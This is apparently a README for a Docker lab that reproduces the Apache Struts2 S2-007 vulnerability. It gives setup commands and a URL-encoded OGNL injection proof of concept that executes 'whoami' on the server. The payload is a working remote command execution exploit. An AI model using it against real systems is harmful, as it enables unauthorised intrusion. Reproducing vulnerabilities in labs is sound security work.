### s2-007 vuldocker

## 测试环境搭建

```
docker-compose build
docker-compose up -d

安全完之后直接访问http://0.0.0.0:30080
```

```
poc:
%27%20%2b%20%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29%20%2b%20%27

```

![1.png](https://raw.githubusercontent.com/Loneyers/vuldocker/master/struts2/s2-007/1.png)

